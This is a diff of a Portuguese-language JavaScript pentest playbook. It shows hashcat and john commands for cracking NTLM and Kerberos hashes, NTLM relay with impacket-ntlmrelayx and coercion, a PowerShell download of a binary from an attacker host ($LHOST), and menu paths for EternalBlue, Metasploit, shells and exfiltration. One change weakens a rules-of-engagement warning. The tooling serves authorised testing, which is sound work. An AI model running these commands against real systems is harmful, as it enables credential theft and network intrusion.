+      say: "Hash sem crack não serve. Modo + wordlist + regras; depois spray/lateral.",
       blocks: [
         {
           title: "Tabela de modos (hashcat)",
@@ -1524,18 +1673,18 @@ curl -s "$TARGET/graphql" -H 'Content-Type: application/json' \\
         },
         {
           title: "hashcat",
-          cmd: `hashcat -m 5600 recon/netntlm.txt $WORDLIST_PASS -r /usr/share/hashcat/rules/best64.rule --force
-hashcat -m 18200 recon/asrep.txt $WORDLIST_PASS --force
-hashcat -m 13100 recon/tgs.txt $WORDLIST_PASS --force
-hashcat -m 1000 recon/ntlm.txt $WORDLIST_PASS -O --force
+          cmd: `hashcat -m 5600 HASHFILE $WORDLIST_PASS -r /usr/share/hashcat/rules/best64.rule --force
+hashcat -m 18200 HASHFILE $WORDLIST_PASS --force
+hashcat -m 13100 HASHFILE $WORDLIST_PASS --force
+hashcat -m 1000 HASHFILE $WORDLIST_PASS -O --force
 # mostra cracked:
-hashcat -m 5600 recon/netntlm.txt --show`,
+hashcat -m 5600 HASHFILE --show`,
           label: "bash",
         },
         {
           title: "john (fallback)",
-          cmd: `john --wordlist=$WORDLIST_PASS recon/hashes.txt
-john --show recon/hashes.txt`,
+          cmd: `john --wordlist=$WORDLIST_PASS HASHFILE
+john --show HASHFILE`,
           label: "bash",
         },
       ],
@@ -1553,8 +1702,8 @@ john --show recon/hashes.txt`,
     "ntlm-relay": {
       phase: "AD",
       title: "NTLM relay",
-      say: "Capturou auth e o alvo não exige signing? Relay > crack. RoE + segmentação local obrigatórios.",
-      tone: "danger",
+      say: "Capturou auth e o alvo não exige signing? Relay > crack. Confere LAN/escopo antes.",
+      tone: "warn",
       blocks: [
         {
           title: "Pré-flight",
@@ -1563,13 +1712,13 @@ john --show recon/hashes.txt`,
             <li>Escopo LAN / coerce autorizado</li>
             <li>Preferir relay pra LDAP/LDAPS com channel binding consciente</li>
           </ul>`,
-          cmd: `nxc smb "$IP" --gen-relay-list recon/relay_targets.txt
+          cmd: `nxc smb "$IP" --gen-relay-list TARGETS.txt
 # targets sem signing`,
           label: "bash",
         },
         {
           title: "ntlmrelayx (conceito)",
-          cmd: `impacket-ntlmrelayx -tf recon/relay_targets.txt -smb2support
+          cmd: `impacket-ntlmrelayx -tf TARGETS.txt -smb2support
 # com coerce (PrinterBug/PetitPotam) no segundo terminal — só se RoE ok
 # socks / -i / dump secrets conforme objetivo`,
           label: "bash",
@@ -1629,7 +1778,7 @@ iwr http://$LHOST/wp.exe -OutFile C:\\Windows\\Temp\\wp.exe
     retest: {
       phase: "Entrega",
       title: "Reteste",
-      say: "Cliente disse que patchou? Não acredita no e-mail. Reproduz o finding com o mesmo ritual — ou documenta que fechou.",
+      say: "Reteste: reproduz o finding. Patchou de verdade ou só no e-mail?",
       blocks: [
         {
           title: "Checklist de reteste",
@@ -1645,10 +1794,10 @@ iwr http://$LHOST/wp.exe -OutFile C:\\Windows\\Temp\\wp.exe
           title: "Nota de reteste",
           cmd: `# [Retest] Título do finding
 
-**Data:** 
+**Data:**
 **Resultado:** Fixed | Partial | Open
 **O que mudou:**
-**Evidência nova:** evidence/retest-…
+**Evidência nova:** print / nota
 
 ## Diff
 Antes: …
@@ -1690,10 +1839,12 @@ Depois: …`,
       { label: "Login / Basic Auth", hint: "Ramo auth", to: "web-auth" },
       { label: "JWT no fluxo", hint: "none/kid/claims", to: "web-jwt" },
       { label: "SQLi confirmado", hint: "sqlmap / manual", to: "web-sqli" },
-      { label: "Nuclei na superfície", hint: "templates CVE", to: "nuclei" },
+      { label: "Nuclei na superfície", hint: "templates CVE · misconfig", to: "nuclei" },
       { label: "WordPress", hint: "wpscan", to: "wordpress" },
       { label: "Jenkins", hint: "script console", to: "jenkins" },
       { label: "Tomcat /manager", hint: "Deploy / MSF", to: "tomcat" },
+      { label: "Burp Suite", hint: "Proxy · Repeater", to: "burp-method" },
+      { label: "Metasploit", hint: "msfconsole · handler", to: "msf" },
       /* windows / ad */
       { label: "445 / 139 · SMB", hint: "Shares · EternalBlue", to: "smb" },
       { label: "nxc / NetExec SMB", hint: "spray · sam · exec", to: "nxc-smb" },
@@ -1723,13 +1874,15 @@ Depois: …`,
       { label: "APK no escopo", hint: "apktool · jadx", to: "android-apk" },
       /* closeout */
       { label: "Já tenho RCE — preciso de shell", hint: "Listener", to: "shell" },
+      { label: "Metasploit", hint: "msfconsole · handler", to: "msf" },
       { label: "Achado válido — reportar", hint: "Finding", to: "report" },
     ];
   }
 
   if (pb.nodes.web) {
     pb.nodes.web.choices = [
-      { label: "Tem login / auth", to: "web-auth" },
+      { label: "401 / Basic Auth / pasta protegida", hint: "/protected/ · hydra http-get", to: "web-auth" },
+      { label: "Tem login form (POST)", to: "web-auth" },
       { label: "API / OpenAPI / BOLA", to: "web-api" },
       { label: "GraphQL", to: "web-graphql" },
       { label: "JWT", to: "web-jwt" },
@@ -1745,11 +1898,12 @@ Depois: …`,
       { label: "Deserialização", to: "web-deserial" },
       { label: "Cache poisoning / deception", to: "web-cache" },
       { label: "Nuclei", to: "nuclei" },
-      { label: "Método Burp (1 var)", to: "burp-method" },
+      { label: "Burp Suite", hint: "Proxy · Repeater", to: "burp-method" },
       { label: "WordPress", to: "wordpress" },
       { label: "Jenkins", to: "jenkins" },
       { label: "Tomcat /manager", to: "tomcat" },
-      { label: "RCE / upload — preciso de callback", to: "shell" },
+      { label: "Metasploit", hint: "msfconsole", to: "msf" },
+      { label: "RCE — shell / handler", to: "shell" },
       { label: "Provei impacto — reportar", to: "report" },
       { label: "Voltar ao mapa de portas", to: "ports" },
     ];
@@ -1757,7 +1911,10 @@ Depois: …`,
 
   if (pb.nodes["web-auth"]) {
     pb.nodes["web-auth"].choices = [
-      { label: "Entrei — remapear app autenticado", to: "web" },
+      { label: "Entrei — Nuclei autenticado", hint: "Header Basic", to: "nuclei" },
+      { label: "Entrei — remapear app", to: "web" },
+      { label: "Cred → Tomcat /manager", hint: "testar reuse", to: "tomcat" },
+      { label: "Burp Suite", to: "burp-method" },
       { label: "JWT no fluxo", to: "web-jwt" },
       { label: "OAuth / OIDC", to: "web-oauth" },
       { label: "SQLi no login", to: "web-sqli" },
@@ -1768,6 +1925,7 @@ Depois: …`,
 
   if (pb.nodes.shell) {
     pb.nodes.shell.choices = [
+      { label: "Metasploit (hub)", to: "msf" },
       { label: "Privesc Linux", to: "privesc-linux" },
       { label: "Privesc Windows", to: "privesc-windows" },
       { label: "Trazer tool / exfil", to: "file-xfer" },
@@ -1780,6 +1938,7 @@ Depois: …`,
   if (pb.nodes.smb) {
     pb.nodes.smb.choices = [
       { label: "nxc / NetExec fundo", to: "nxc-smb" },
+      { label: "Metasploit (EternalBlue / hub)", to: "msf" },
       { label: "AD hub", to: "ad-attack" },
       { label: "Kerberos / roast", to: "kerberos" },
       { label: "Hash → crack", to: "crack-hash" },
@@ -1870,4 +2029,9 @@ Depois: …`,
       pb.nodes["ad-attack"].choices = ad;
     }
   }
+
+  /* Fase 1 · prompt 04 — wire paths → KnowledgeEntry */
+  if (pb.nodes["web-ssrf"]) pb.nodes["web-ssrf"].knowledgeIds = ["ssrf"];
+  if (pb.nodes["web-jwt"]) pb.nodes["web-jwt"].knowledgeIds = ["jwt-attacks"];
+  if (pb.nodes["web-sqli"]) pb.nodes["web-sqli"].knowledgeIds = ["sqli"];
 })();
